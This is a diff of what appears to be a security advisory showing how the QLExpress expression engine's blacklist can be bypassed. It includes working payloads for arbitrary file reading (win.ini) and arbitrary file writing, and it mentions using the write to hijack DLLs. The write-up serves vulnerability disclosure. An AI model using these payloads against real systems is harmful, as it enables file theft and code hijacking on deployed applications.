@@ -31,12 +31,16 @@ However, QLExpress has a blacklist filter that blocks commonly used execution co
 <img width="1830" height="961" alt="image" src="https://github.com/user-attachments/assets/5f744841-0621-45b6-8e13-8d1ce9da6de2" />
 
 However, the blacklist does not prohibit the creation of new File objects. When we use the following payload, we can read any file. Local test.
+```
 is = new java.io.FileInputStream (\"C:/Windows/win.ini\");buffer = new byte[ is.available ()]; is.read (buffer);content = n ew String(buffer); is.close (); content;
+```
 
 <img width="1836" height="965" alt="image" src="https://github.com/user-attachments/assets/1d397c33-8674-4761-bc59-0134e4afd4fc" />
 
 Arbitrary file writing
-os = new java.io.FileOutputStream (\"D:/test.txt\"); content = \"test123\"; os.write ( content.getBytes ()); os.close ( );
+```
+os = new java.io.FileOutputStream(\"D:/test.txt\"); content = \"test123\"; os.write(content.getBytes());os.close ();
+```
 Java does not have system permissions in a Windows environment, so it cannot write to the system directory, but it can write to DLLs and hijack other software DLLs .
 
 <img width="1822" height="962" alt="image" src="https://github.com/user-attachments/assets/d39bdf36-d51d-459e-9e32-f246d6b4e874" />
